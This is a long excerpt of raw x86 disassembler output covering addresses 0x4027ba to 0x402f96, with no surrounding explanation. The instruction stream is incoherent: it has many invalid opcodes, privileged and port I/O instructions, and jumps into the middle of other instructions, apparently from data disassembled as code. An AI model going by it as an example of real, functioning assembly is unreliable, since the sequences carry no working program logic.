  4027ba:	push   edi
  4027bb:	fiadd  DWORD PTR [edx+0x69156361]
  4027c1:	fstp   DWORD PTR [edx]
  4027c3:	adc    dh,ah
  4027c5:	cmp    DWORD PTR [ebp+eiz*1+0x7166f930],0x5c8519ff
  4027d0:	ds das 
  4027d2:	or     eax,0x1d2ca0f0
  4027d8:	loope  0x4027c2
  4027da:	cmp    esp,edi
  4027dc:	aad    0xda
  4027de:	(bad)  
  4027df:	int3   
  4027e0:	xchg   ebx,eax
  4027e1:	lea    edx,[ebp+0x2c22f629]
  4027e7:	rcr    DWORD PTR [eax-0xb],cl
  4027ea:	loope  0x4027f3
  4027ec:	popf   
  4027ed:	in     al,dx
  4027ee:	into   
  4027ef:	aam    0xb1
  4027f1:	push   ebp
  4027f2:	mov    eax,ds:0x4120c749
  4027f7:	jle    0x4027f9
  4027f9:	daa    
  4027fa:	into   
  4027fb:	push   ss
  4027fc:	pop    ebp
  4027fd:	into   
  4027fe:	push   ebp
  4027ff:	dec    ebx
  402800:	cmp    cl,BYTE PTR [ecx-0x2]
  402803:	ret    0xa75f
  402806:	retf   
  402807:	fwait
  402808:	ret    
  402809:	jb     0x402875
  40280b:	rcl    DWORD PTR [ebx],1
  40280d:	ds push cs
  40280f:	pop    edx
  402810:	mov    dl,0x8a
  402812:	adc    BYTE PTR [eax],dl
  402814:	dec    esp
  402815:	sub    bl,cl
  402817:	stc    
  402818:	xchg   esp,eax
  402819:	jnp    0x4027c7
  40281b:	fnstsw WORD PTR [edi+0x43]
  40281e:	or     eax,esi
  402820:	aas    
  402821:	sub    esi,edx
  402823:	xchg   esp,eax
  402824:	xor    ch,BYTE PTR [ebp-0x48e29be4]
  40282a:	mov    esp,0xe0a3ab13
  40282f:	ins    BYTE PTR es:[edi],dx
  402830:	das    
  402831:	dec    esp
  402832:	repz mov ds:0xa9fddd70,eax
  402838:	popf   
  402839:	test   eax,0x39c48469
  40283e:	adc    BYTE PTR [ebp+0x17],bh
  402841:	xchg   cl,ch
  402843:	loop   0x4028ae
  402845:	call   0x5ff9:0x48294ccd
  40284c:	mov    WORD PTR [ecx+eiz*4],gs
  40284f:	mov    edx,0xc6fd2c2e
  402854:	mov    BYTE PTR [esi+0x18e63a96],cl
  40285a:	mov    BYTE PTR [edx-0x720e780a],ah
  402860:	ret    
  402861:	inc    edx
  402863:	ret    0x9b0e
  402866:	mov    bh,BYTE PTR [edx-0x4]
  402869:	loopne 0x40288f
  40286b:	jp     0x4028c6
  40286d:	cmp    eax,0xf451af47
  402872:	xchg   ebp,eax
  402873:	pop    es
  402874:	sub    dl,ch
  402876:	xchg   esp,eax
  402877:	cdq    
  402878:	jmp    0x402851
  40287a:	ror    DWORD PTR [edx+0x3f],cl
  40287d:	mov    edx,0x45416a32
  402882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402883:	mov    BYTE PTR [ecx+0x4c],ah
  402886:	sbb    cl,BYTE PTR [eax+0x72c776e5]
  40288c:	add    bh,dh
  40288e:	call   0x8ea1eac
  402893:	jl     0x402908
  402895:	jle    0x402898
  402897:	leave  
  402898:	mov    al,ds:0x74626bad
  40289d:	xchg   edi,eax
  40289e:	hlt    
  40289f:	inc    ecx
  4028a0:	(bad)  
  4028a1:	xor    al,0x46
  4028a3:	mov    WORD PTR [eax+0xf6611ce],fs
  4028a9:	jle    0x4028f8
  4028ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028ac:	adc    esp,DWORD PTR [ebp+0x70]
  4028af:	dec    ebp
  4028b0:	add    al,bl
  4028b2:	data16 shr BYTE PTR [ecx+0x380ed64e],0xcd
  4028ba:	mov    DWORD PTR [ebp+0x7bab9c30],esp
  4028c0:	mov    ecx,0x4ea958fb
  4028c5:	pop    ebp
  4028c6:	mov    ebx,0x6e9869f6
  4028cb:	enter  0x5b4e,0x71
  4028cf:	int3   
  4028d0:	mov    edx,0x4cb629b8
  4028d5:	enter  0x5dce,0x37
  4028d9:	test   BYTE PTR [eax+0x71],al
  4028dc:	xchg   ebp,eax
  4028dd:	and    al,0xe4
  4028df:	sbb    cl,al
  4028e1:	xchg   esi,eax
  4028e2:	iret   
  4028e3:	mov    ecx,0xea714be3
  4028e8:	jns    0x4028af
  4028ea:	lds    ebx,FWORD PTR ds:0x2387b19b
  4028f0:	jl     0x40290d
  4028f2:	xchg   ebp,eax
  4028f3:	in     al,dx
  4028f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028f5:	test   DWORD PTR [ebx*4-0x3acb8df1],0x11adfdd6
  402900:	out    dx,al
  402901:	xchg   ecx,eax
  402902:	pop    ecx
  402903:	aam    0x93
  402905:	addr16 hlt 
  402907:	cwde   
  402908:	sub    al,0x9a
  40290a:	push   esi
  40290b:	mov    ds:0x2e27fa15,al
  402910:	mov    dl,0x87
  402912:	(bad)  
  402914:	sahf   
  402915:	les    edi,FWORD PTR [ebx]
  402917:	inc    ch
  402919:	loopne 0x4028a1
  40291b:	lods   al,BYTE PTR ds:[esi]
  40291c:	out    0x5e,al
  40291e:	je     0x402948
  402920:	mov    edx,ebp
  402922:	pop    edi
  402923:	popf   
  402924:	jae    0x40297e
  402926:	or     BYTE PTR [ecx],al
  402928:	xabort 0x99
  40292b:	inc    edi
  40292c:	xor    eax,ecx
  40292e:	jno    0x402958
  402930:	stos   BYTE PTR es:[edi],al
  402931:	dec    ecx
  402932:	not    BYTE PTR [ecx+ebx*2]
  402935:	pop    edi
  402936:	dec    ebp
  402937:	jg     0x40298a
  402939:	pusha  
  40293a:	sbb    BYTE PTR ds:0x42e7bafa,0xac
  402941:	sbb    al,0x8e
  402943:	aas    
  402944:	retf   
  402945:	mov    esp,0x2661e749
  40294a:	adc    BYTE PTR ds:0x801ec80b,ah
  402950:	ds push ebx
  402952:	adc    bh,BYTE PTR [edx]
  402954:	add    eax,0xdab29584
  402959:	mov    edx,0x982c9b7e
  40295e:	ja     0x40294b
  402960:	cmp    BYTE PTR [ebp-0xb],bh
  402963:	js     0x40290a
  402965:	stos   BYTE PTR es:[edi],al
  402966:	push   esi
  402967:	retf   0xdb53
  40296a:	and    DWORD PTR [eax-0x68],ecx
  40296d:	mov    edx,gs
  40296f:	mov    esi,0xd9fc422
  402974:	ds jle 0x402935
  402977:	aas    
  402978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402979:	push   eax
  40297a:	push   0xffffffdb
  40297c:	clc    
  40297d:	pop    eax
  40297e:	jno    0x402925
  402980:	retf   
  402981:	fsubr  DWORD PTR [edi]
  402983:	xchg   ecx,eax
  402984:	cs dec edx
  402986:	xor    eax,0x6c6bf2d4
  40298b:	fcom   QWORD PTR [esp+ebx*8]
  40298e:	or     eax,DWORD PTR [edx-0x6f]
  402991:	add    BYTE PTR [ecx+0x30],0x81
  402995:	pop    esp
  402996:	imul   eax,DWORD PTR [ebx+edx*8],0xdafb54fa
  40299d:	or     eax,0xf03b03da
  4029a2:	loopne 0x40293a
  4029a4:	fcmovne st,st(4)
  4029a6:	mov    ebp,0xe09b3361
  4029ab:	(bad)  
  4029ad:	fmul   QWORD PTR [edi+0x1d]
  4029b0:	mov    edx,0xada36b89
  4029b5:	enter  0x7bd2,0x5f
  4029b9:	dec    esp
  4029ba:	add    ecx,esi
  4029bc:	xchg   esi,eax
  4029bd:	adc    eax,0xed8a7246
  4029c2:	ins    DWORD PTR es:[edi],dx
  4029c3:	ja     0x402995
  4029c5:	mov    al,ds:0xc9d07818
  4029ca:	sub    al,ah
  4029cc:	lea    ebx,[eax+0x334b2b8c]
  4029d2:	(bad)  
  4029d3:	mov    DWORD PTR ds:0xe4195914,ebx
  4029d9:	mov    ebp,0xd80b9ef0
  4029de:	or     eax,0x152d27d3
  4029e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029e4:	mov    dl,0x2b
  4029e6:	rcr    DWORD PTR [ecx+eiz*1],1
  4029e9:	adc    dl,BYTE PTR [edx]
  4029eb:	xlat   BYTE PTR ds:[ebx]
  4029ec:	daa    
  4029ed:	data16 jb 0x402a36
  4029f0:	and    eax,0x653cc55e
  4029f5:	jb     0x4029b8
  4029f7:	popf   
  4029f8:	popf   
  4029f9:	pop    eax
  4029fa:	pop    ebp
  4029fb:	xchg   esp,eax
  4029fc:	dec    ebp
  4029fd:	outs   dx,BYTE PTR ds:[esi]
  4029fe:	pop    edx
  4029ff:	enter  0x2173,0x55
  402a03:	dec    edi
  402a04:	cmp    eax,0x9c84dc7f
  402a09:	scas   al,BYTE PTR es:[edi]
  402a0a:	sub    BYTE PTR [ecx],dh
  402a0c:	pop    ss
  402a0d:	test   al,0x80
  402a0f:	je     0x40299e
  402a11:	mov    cl,cl
  402a13:	jmp    0x4029c6
  402a15:	sub    ecx,ecx
  402a17:	push   ebp
  402a18:	fsubr  QWORD PTR [eax+0x7d]
  402a1b:	loopne 0x402a4f
  402a1d:	jg     0x402a11
  402a1f:	mov    DWORD PTR [ebp+0x564ff54a],esi
  402a25:	mov    edx,DWORD PTR [ebx]
  402a27:	out    dx,eax
  402a28:	arpl   WORD PTR [eax+edx*2-0xa99c810],di
  402a2f:	ret    0x5e61
  402a32:	imul   esi,DWORD PTR [edx+0x4205d99a],0xc46f9e8f
  402a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a3d:	les    ecx,FWORD PTR [esi-0x7dfcd3a0]
  402a43:	in     al,0xa6
  402a45:	dec    ebp
  402a46:	scas   eax,DWORD PTR es:[edi]
  402a47:	and    BYTE PTR [ebp+0x62325620],bl
  402a4d:	call   0x326be087
  402a52:	ror    DWORD PTR [edx+edx*8-0xa],1
  402a56:	mov    DWORD PTR ds:0x9c13785a,ebx
  402a5c:	adc    eax,DWORD PTR [edi-0x37]
  402a5f:	pop    ss
  402a60:	ret    0x1f59
  402a63:	and    eax,DWORD PTR [ebx+eax*2+0x5c7dd9ba]
  402a6a:	jbe    0x402a68
  402a6c:	pop    edi
  402a6d:	and    esp,DWORD PTR [eax+0x62]
  402a70:	pop    es
  402a71:	xchg   ebx,eax
  402a72:	push   0x9
  402a74:	sbb    DWORD PTR [ebp-0x45],eax
  402a77:	cld    
  402a78:	dec    esp
  402a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a7a:	loopne 0x402abe
  402a7c:	or     eax,0xe5877cc6
  402a81:	mov    dl,0x67
  402a83:	and    DWORD PTR [ebp+0x71],ecx
  402a86:	pop    ebp
  402a87:	mov    ecx,0x8bfb71ec
  402a8c:	mov    eax,ds:0x89838ec2
  402a91:	cmp    DWORD PTR [ecx+0xae8d481],ecx
  402a97:	xor    al,BYTE PTR [edi+0x23]
  402a9a:	add    BYTE PTR [ebx],bl
  402a9c:	stos   DWORD PTR es:[edi],eax
  402a9d:	add    DWORD PTR [esi-0x1b],edx
  402aa0:	xchg   ecx,eax
  402aa1:	sti    
  402aa2:	jle    0x402a6a
  402aa4:	or     eax,ecx
  402aa6:	int3   
  402aa7:	and    DWORD PTR [edx+0x57168a65],esi
  402aad:	and    eax,0x2b51e682
  402ab2:	pop    edx
  402ab3:	loopne 0x402a9b
  402ab5:	inc    ebp
  402ab6:	or     esi,DWORD PTR [edi]
  402ab8:	push   edi
  402ab9:	add    edx,DWORD PTR [edx+0x6998dc6e]
  402abf:	imul   DWORD PTR [edx+edx*1-0x7cc40270]
  402ac6:	xor    DWORD PTR [ebx+0x44b14df5],edi
  402acc:	aam    0xf1
  402ace:	fwait
  402acf:	inc    edx
  402ad0:	or     dl,ah
  402ad2:	cmc    
  402ad3:	mov    ecx,0x1b9e9205
  402ad8:	push   es
  402ad9:	or     ebp,DWORD PTR [ebp-0x7250562f]
  402adf:	fdivr  st,st(7)
  402ae1:	jge    0x402b3c
  402ae3:	out    0xce,eax
  402ae5:	call   eax
  402ae7:	(bad)  [edx-0x72]
  402aea:	pop    edx
  402aeb:	and    eax,0xa3c2cc3d
  402af0:	sub    ebp,0x1a8753a1
  402af6:	xor    bh,BYTE PTR [esp+eax*8+0x4efe7f3]
  402afd:	loop   0x402ab5
  402aff:	cdq    
  402b00:	fsubr  st,st(3)
  402b02:	hlt    
  402b03:	fiadd  DWORD PTR [ecx+0x292e8639]
  402b09:	xor    al,0xf5
  402b0b:	(bad)  
  402b0c:	daa    
  402b0d:	fcmovb st,st(0)
  402b0f:	fidivr DWORD PTR [edi-0x66ac35e3]
  402b15:	ret    
  402b16:	sub    eax,0x4385025e
  402b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b1c:	dec    edi
  402b1d:	test   BYTE PTR [esi-0x52e2110],cl
  402b23:	shr    BYTE PTR [eax+esi*2+0x1306006c],0xb4
  402b2b:	and    ebx,DWORD PTR [esp+ebp*4+0x7]
  402b2f:	ds mov al,0xc
  402b32:	pop    esp
  402b33:	xchg   BYTE PTR [eax-0x4f53c9b6],bl
  402b39:	mov    al,0x61
  402b3b:	xchg   ebx,eax
  402b3c:	xor    ebp,edx
  402b3e:	call   0xddc46c4c
  402b43:	xor    esi,DWORD PTR [ebp-0x16]
  402b46:	inc    edi
  402b47:	repnz mov ?,ebp
  402b4a:	or     ebx,esi
  402b4c:	imul   eax,DWORD PTR [eax],0xffffffdd
  402b4f:	pop    ss
  402b50:	test   eax,0xea08a882
  402b55:	cdq    
  402b56:	inc    edi
  402b57:	pop    edi
  402b58:	xor    eax,0xfb5628d8
  402b5d:	repnz rcl BYTE PTR [ecx+edx*2+0x5d],1
  402b62:	mov    cl,0x87
  402b64:	push   ss
  402b65:	or     eax,0xcf9739a6
  402b6a:	mov    ds:0x5bf4a51b,eax
  402b6f:	cdq    
  402b70:	(bad)  
  402b71:	pop    esi
  402b72:	sti    
  402b73:	mov    ebx,0xf2fd6239
  402b78:	mov    eax,0x78f19ab6
  402b7d:	push   ss
  402b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b7f:	mul    BYTE PTR [ecx+0x4e]
  402b82:	js     0x402b25
  402b84:	adc    al,0xe9
  402b86:	test   BYTE PTR [ebx],cl
  402b88:	in     eax,0xbd
  402b8a:	mov    edi,0x67a0c590
  402b8f:	inc    esp
  402b90:	mov    dh,0x22
  402b92:	test   BYTE PTR [edi],bh
  402b94:	inc    edx
  402b95:	add    DWORD PTR [ecx],0x3a8b89e9
  402b9b:	mov    esp,0xccd02e40
  402ba0:	jg     0x402beb
  402ba2:	ds aam 0x59
  402ba5:	adc    edx,DWORD PTR [esi+0x1]
  402ba8:	and    DWORD PTR [edi+0x274c404],0x82ab0432
  402bb2:	sbb    al,0xa8
  402bb4:	loop   0x402b97
  402bb6:	popf   
  402bb7:	mov    WORD PTR [edi],fs
  402bb9:	clc    
  402bba:	xchg   ecx,eax
  402bbb:	jg     0x402c27
  402bbd:	ffree  st(7)
  402bbf:	dec    esi
  402bc0:	ret    0xefe3
  402bc3:	rol    BYTE PTR [eax+0x5c],0x3e
  402bc7:	push   es
  402bc8:	je     0x402bb6
  402bca:	in     eax,0xce
  402bcc:	sahf   
  402bcd:	gs mov esp,0x351a1e71
  402bd3:	push   0xfa8e4d38
  402bd8:	lods   eax,DWORD PTR ds:[esi]
  402bd9:	dec    ecx
  402bda:	push   esp
  402bdb:	enter  0x3e5,0x5f
  402bdf:	push   0xec61a1a3
  402be4:	(bad)  
  402be5:	out    0xb3,al
  402be7:	adc    BYTE PTR [ebx],0xa9
  402bea:	enter  0xf225,0xe9
  402bee:	shl    DWORD PTR fs:[edx+ebp*4-0x4e],0xa5
  402bf4:	aad    0x2e
  402bf6:	sub    BYTE PTR ds:0x1f9bd031,al
  402bfc:	sbb    esi,DWORD PTR [ebx+ebx*1-0x1f]
  402c00:	call   FWORD PTR [esi+0x53]
  402c03:	add    DWORD PTR [edi+esi*4+0x3b945fa8],ecx
  402c0a:	sahf   
  402c0b:	(bad)  
  402c0c:	addr16 sahf 
  402c0e:	fwait
  402c0f:	or     al,0xff
  402c11:	sbb    ecx,DWORD PTR [ebx+0x1c]
  402c14:	std    
  402c15:	test   eax,0x7dc50de3
  402c1a:	gs pushf 
  402c1c:	repz sub ecx,DWORD PTR [edi]
  402c1f:	cmp    al,0xb6
  402c21:	int3   
  402c22:	push   ebp
  402c23:	or     esp,edx
  402c25:	int3   
  402c26:	jle    0x402c3b
  402c28:	sbb    al,BYTE PTR [ecx-0x7da77ad]
  402c2e:	popf   
  402c2f:	or     BYTE PTR [ebx+0x25979dfe],ch
  402c35:	fcmovu st,st(7)
  402c37:	sub    al,0x79
  402c39:	hlt    
  402c3a:	sbb    BYTE PTR [edi+0x1ccb46d5],dl
  402c40:	cwde   
  402c41:	ficom  DWORD PTR [edx-0x5446fc87]
  402c47:	cmp    BYTE PTR ds:0x326ed5b,ah
  402c4d:	push   edx
  402c4e:	popf   
  402c4f:	xchg   edx,eax
  402c50:	cmp    eax,0x3b5fd34f
  402c55:	scas   al,BYTE PTR es:[edi]
  402c56:	neg    DWORD PTR [edx+0x12]
  402c59:	ds inc ebx
  402c5b:	aad    0xc5
  402c5d:	fwait
  402c5e:	idiv   BYTE PTR fs:[ebx+0x6e]
  402c62:	dec    ebp
  402c63:	imul   edi,DWORD PTR [edi-0x6],0xa
  402c67:	push   esi
  402c68:	sub    dh,cl
  402c6a:	cmp    cl,bl
  402c6c:	push   ebx
  402c6d:	sar    DWORD PTR [ecx],0xb7
  402c70:	jmp    0x7257:0x219d9a9d
  402c77:	inc    esi
  402c78:	lea    ecx,[edx-0x13685845]
  402c7e:	(bad)  
  402c7f:	in     al,dx
  402c80:	sub    esi,ecx
  402c82:	cli    
  402c83:	xchg   esi,eax
  402c84:	pop    esp
  402c85:	addr16 jge 0x402c71
  402c88:	inc    esp
  402c89:	sub    eax,0xdea1f6cc
  402c8e:	dec    eax
  402c8f:	test   BYTE PTR [edx],al
  402c91:	nop
  402c92:	sbb    dl,ah
  402c94:	fild   WORD PTR [esi]
  402c96:	leave  
  402c97:	add    eax,0x409b81ec
  402c9c:	lock mov eax,ds:0x1117f38e
  402ca2:	or     BYTE PTR [edi-0x665515cf],ah
  402ca8:	mov    cl,0x84
  402caa:	fwait
  402cab:	shl    edi,0xec
  402cae:	and    bl,BYTE PTR [edi-0x3c812f9b]
  402cb4:	fwait
  402cb5:	inc    ebp
  402cb6:	cwde   
  402cb7:	jbe    0x402cfa
  402cb9:	xchg   edx,eax
  402cba:	fwait
  402cbb:	add    ebx,DWORD PTR [ebx+0x5d]
  402cbe:	adc    eax,0x452b0d14
  402cc3:	leave  
  402cc4:	repnz jecxz 0x402d1e
  402cc7:	mov    eax,0x9b47ff9f
  402ccc:	mov    gs,edx
  402cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ccf:	nop
  402cd0:	adc    al,0x15
  402cd2:	jmp    0x8a82cec7
  402cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cd8:	cmp    esi,DWORD PTR [eax]
  402cda:	mov    ah,0x70
  402cdc:	jnp    0x402c64
  402cde:	pop    edi
  402cdf:	mov    cl,0xc4
  402ce1:	cli    
  402ce2:	mov    al,0xeb
  402ce4:	enter  0x1950,0x3a
  402ce8:	hlt    
  402ce9:	ss dec ebp
  402ceb:	dec    esi
  402cec:	sub    al,cl
  402cee:	dec    eax
  402cef:	ss pop eax
  402cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cf3:	ins    DWORD PTR es:[edi],dx
  402cf4:	xor    dh,bl
  402cf6:	fstp   DWORD PTR ds:0xd97bf22f
  402cfc:	sub    bl,BYTE PTR [eax+0x11af7c83]
  402d02:	adc    BYTE PTR [esi-0x21b2e721],cl
  402d08:	adc    ecx,esp
  402d0a:	ss push ss
  402d0c:	xchg   ecx,eax
  402d0d:	xlat   BYTE PTR ds:[ebx]
  402d0e:	mov    dl,BYTE PTR [edi+edi*8-0x42]
  402d12:	xchg   ebp,eax
  402d13:	loopne 0x402d50
  402d15:	push   ecx
  402d16:	lds    edi,FWORD PTR [esi-0x5899fa1e]
  402d1c:	sbb    esi,esi
  402d1e:	test   eax,0xefa9c504
  402d23:	or     eax,0x9bd0c47
  402d28:	scas   eax,DWORD PTR es:[edi]
  402d29:	adc    ebx,0x26
  402d2c:	or     al,BYTE PTR [eax]
  402d2e:	xchg   esp,eax
  402d2f:	les    eax,FWORD PTR [esi]
  402d31:	inc    ecx
  402d32:	(bad)  
  402d34:	cld    
  402d35:	inc    edx
  402d36:	push   ebx
  402d37:	dec    ebp
  402d38:	in     eax,dx
  402d39:	(bad)  
  402d3b:	and    DWORD PTR [ecx+0x3e],esi
  402d3e:	jnp    0x402d60
  402d40:	aad    0x89
  402d42:	loope  0x402db5
  402d44:	addr16 jle 0x402d0f
  402d47:	outs   dx,BYTE PTR ds:[esi]
  402d48:	push   es
  402d49:	das    
  402d4a:	mov    bl,0x54
  402d4c:	xor    al,0x34
  402d4e:	jge    0x402da2
  402d50:	(bad)  
  402d51:	fsub   DWORD PTR [edi*2-0x4b538dca]
  402d58:	sbb    eax,0xf3402adc
  402d5d:	icebp  
  402d5e:	mov    cl,BYTE PTR [ecx+0x392df9c2]
  402d64:	fist   WORD PTR [ebx+0x2e01fdba]
  402d6a:	jge    0x402dc1
  402d6c:	adc    ch,BYTE PTR [ebx-0x54]
  402d6f:	sti    
  402d70:	fcomp  QWORD PTR [ebp+0x393d0836]
  402d76:	cld    
  402d77:	jle    0x402d55
  402d79:	lods   al,BYTE PTR ds:[esi]
  402d7a:	pop    ebx
  402d7b:	sbb    ebp,DWORD PTR ds:0x7eb01c76
  402d81:	ficom  DWORD PTR [ebx+0x8a31b38]
  402d87:	mov    al,0x80
  402d89:	dec    ebp
  402d8a:	adc    BYTE PTR [ebp+0x5ab2f476],cl
  402d90:	shl    BYTE PTR [esi],1
  402d92:	sbb    BYTE PTR [esi-0x6a],bl
  402d95:	popa   
  402d96:	dec    ecx
  402d97:	adc    ecx,ebp
  402d99:	sub    al,0x24
  402d9b:	je     0x402dd7
  402d9d:	minps  xmm4,XMMWORD PTR gs:[ebx-0x73]
  402da2:	mov    edi,0xbc982b91
  402da7:	add    bh,BYTE PTR [edx-0x2c]
  402daa:	sbb    al,0x3a
  402dac:	into   
  402dad:	lock scas eax,DWORD PTR es:[edi]
  402daf:	pop    ebp
  402db0:	inc    esi
  402db1:	sbb    cl,BYTE PTR [ecx-0x56]
  402db4:	pop    ds
  402db5:	outs   dx,DWORD PTR ds:[esi]
  402db6:	dec    eax
  402db7:	repnz (bad) 
  402db9:	mov    al,ds:0x9486acc1
  402dbe:	or     eax,0x73b6f883
  402dc3:	push   edi
  402dc4:	adc    eax,0x3fef369
  402dc9:	(bad)  
  402dca:	addr16 pop es
  402dcc:	add    DWORD PTR [esi],0x0
  402dcf:	mov    al,ds:0x4ef3ea51
  402dd4:	mov    esp,0x149dac9c
  402dd9:	mov    BYTE PTR [ecx],bl
  402ddb:	mov    al,ds:0xcdf4ecfd
  402de0:	pop    edx
  402de1:	jecxz  0x402e2e
  402de3:	jns    0x402d9e
  402de5:	mov    ah,0x16
  402de7:	iret   
  402de8:	and    dh,BYTE PTR [ebp+0x35]
  402deb:	mov    esp,0x5c70395d
  402df0:	and    dl,bh
  402df2:	ja     0x402e26
  402df4:	pop    ds
  402df5:	jle    0x402e1a
  402df7:	dec    ebx
  402df8:	xor    bl,bl
  402dfa:	ret    
  402dfb:	pop    ss
  402dfc:	dec    ecx
  402dfd:	les    eax,FWORD PTR [eax-0x55]
  402e00:	inc    ecx
  402e01:	xor    BYTE PTR [eax],ch
  402e03:	and    DWORD PTR [ecx],esi
  402e05:	mov    esp,0xafeb83cb
  402e0a:	mov    BYTE PTR [ebp+ecx*1-0x15e0f46f],dh
  402e11:	ffreep st(0)
  402e13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e14:	je     0x402d98
  402e16:	pop    ecx
  402e17:	les    ecx,FWORD PTR [ebx+edx*1-0x43b6c943]
  402e1e:	mov    al,ds:0xec921258
  402e23:	xor    esp,DWORD PTR [ebx-0x17]
  402e26:	dec    esp
  402e27:	push   eax
  402e28:	adc    DWORD PTR [edi+0x1bd2559a],eax
  402e2e:	or     BYTE PTR [edx-0x242d9294],bl
  402e34:	jl     0x402e55
  402e36:	mov    bh,0x3c
  402e38:	popf   
  402e39:	je     0x402ddc
  402e3b:	aaa    
  402e3c:	xchg   ebp,eax
  402e3d:	xor    eax,0xe584c31
  402e42:	push   ecx
  402e43:	test   DWORD PTR [ecx+0x57],ebp
  402e46:	(bad)  
  402e47:	loopne 0x402eb8
  402e49:	xor    BYTE PTR [esi-0x267e4a2f],0x68
  402e50:	push   esi
  402e51:	outs   dx,DWORD PTR ds:[esi]
  402e52:	inc    edi
  402e53:	cs cdq 
  402e55:	loop   0x402eb9
  402e57:	mov    ah,0x32
  402e59:	dec    esi
  402e5a:	xchg   esi,eax
  402e5b:	inc    ebx
  402e5c:	push   es
  402e5d:	rol    BYTE PTR [ecx],1
  402e5f:	adc    DWORD PTR [esi],0xf41fa461
  402e65:	dec    ebx
  402e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e67:	cmp    bl,0xad
  402e6a:	in     eax,dx
  402e6b:	mov    cl,0x8c
  402e6d:	aad    0x10
  402e6f:	jo     0x402e58
  402e71:	push   eax
  402e72:	and    DWORD PTR [edx-0x1bd24b7c],ecx
  402e78:	fwait
  402e79:	ret    0x64be
  402e7c:	inc    edi
  402e7d:	fisttp QWORD PTR [esp+ebp*1-0x6c]
  402e81:	fwait
  402e82:	icebp  
  402e83:	ret    0x2b4c
  402e86:	retf   0x976c
  402e89:	dec    esi
  402e8a:	mov    edi,DWORD PTR [ecx+0x7d345ca4]
  402e90:	sub    al,0xce
  402e92:	in     al,0x44
  402e94:	mov    ?,edx
  402e96:	cdq    
  402e97:	mov    dl,0x4b
  402e99:	stc    
  402e9a:	push   0xffffff86
  402e9c:	in     al,0x45
  402e9e:	jle    0x402e61
  402ea0:	cmp    al,0x74
  402ea2:	in     eax,dx
  402ea3:	mov    ss,WORD PTR [ecx]
  402ea5:	lock shr DWORD PTR [ecx-0x48b36502],1
  402eac:	mov    ch,0x1b
  402eae:	mov    edi,0x17d02eff
  402eb3:	xchg   BYTE PTR ss:[esi-0x606cbd04],ah
  402eba:	pop    esi
  402ebb:	std    
  402ebc:	push   esi
  402ebd:	inc    edx
  402ebe:	imul   esp,DWORD PTR ds:0x2301,0x99e1de47
  402ec7:	fist   WORD PTR cs:[ebx]
  402eca:	mov    dl,0xdb
  402ecc:	dec    edx
  402ecd:	push   esp
  402ece:	mov    ebx,0x6e37c285
  402ed3:	adc    DWORD PTR [ebx],esi
  402ed5:	imul   edi,ebp,0x1ba6d9c0
  402edb:	xor    cl,BYTE PTR [edx+0x66]
  402ede:	cmp    ch,BYTE PTR [ebx]
  402ee0:	pop    esp
  402ee1:	pop    edi
  402ee2:	aad    0x4c
  402ee4:	cmp    ch,BYTE PTR [ebp+ebx*8-0x1ef20eea]
  402eeb:	push   edx
  402eec:	mov    esi,0xc3cad014
  402ef1:	jecxz  0x402f69
  402ef3:	jne    0x402ee7
  402ef5:	push   ecx
  402ef6:	dec    edx
  402ef7:	mov    ds:0x2d9f9c07,eax
  402efc:	adc    al,BYTE PTR [edx+0x55e56ddd]
  402f02:	(bad)  
  402f03:	jg     0x402e9a
  402f05:	std    
  402f06:	inc    edi
  402f07:	sbb    DWORD PTR [esi+0x11],ecx
  402f0a:	in     eax,0x92
  402f0c:	stos   BYTE PTR es:[edi],al
  402f0d:	stc    
  402f0e:	push   ecx
  402f0f:	mov    DWORD PTR [ebp+eax*2-0x6a],ebx
  402f13:	dec    ebp
  402f14:	ror    esp,cl
  402f16:	cdq    
  402f17:	daa    
  402f18:	adc    cl,ch
  402f1a:	inc    esi
  402f1b:	mul    DWORD PTR [edx+0xcf554f8]
  402f21:	mov    dh,0x30
  402f23:	addr16 mov edx,gs
  402f26:	sbb    eax,0xf0a732d
  402f2b:	dec    esi
  402f2c:	mov    edx,0x43a7f03c
  402f31:	mov    fs,WORD PTR [esi+edi*1]
  402f34:	cdq    
  402f35:	xlat   BYTE PTR ds:[ebx]
  402f36:	bound  edx,QWORD PTR [edi]
  402f38:	fdiv   st(2),st
  402f3a:	hlt    
  402f3b:	add    al,0x15
  402f3d:	cwde   
  402f3e:	add    al,0x5e
  402f40:	cmp    bl,al
  402f42:	push   0x47
  402f44:	out    dx,al
  402f45:	pop    edx
  402f46:	pop    ds
  402f47:	mov    es,esi
  402f49:	mov    ebp,0x32b11d1f
  402f4e:	mov    bl,0xac
  402f50:	sub    edi,DWORD PTR [eax-0x40]
  402f53:	jno    0x402fa9
  402f55:	repz int 0x50
  402f58:	inc    ebx
  402f59:	mov    ecx,0x6adebfc
  402f5e:	sbb    al,BYTE PTR [eax+0x54]
  402f61:	mov    al,0xce
  402f63:	test   BYTE PTR [ebx-0x2b],dh
  402f66:	add    eax,0xc314623d
  402f6b:	mov    ds:0x129c4513,al
  402f70:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  402f72:	mov    bl,0x91
  402f74:	mov    ds,ebp
  402f76:	out    0x45,eax
  402f78:	test   eax,0x45ca0703
  402f7d:	test   DWORD PTR [ecx],0x698d771
  402f83:	sub    dl,BYTE PTR [ebp+0xa]
  402f86:	sbb    eax,0x9e11350d
  402f8b:	cmc    
  402f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f8d:	mov    ecx,0xd8b5999c
  402f92:	(bad)  
  402f93:	push   edx
  402f94:	ins    DWORD PTR es:[edi],dx
  402f95:	cli    
  402f96:	jecxz  0x402f5f
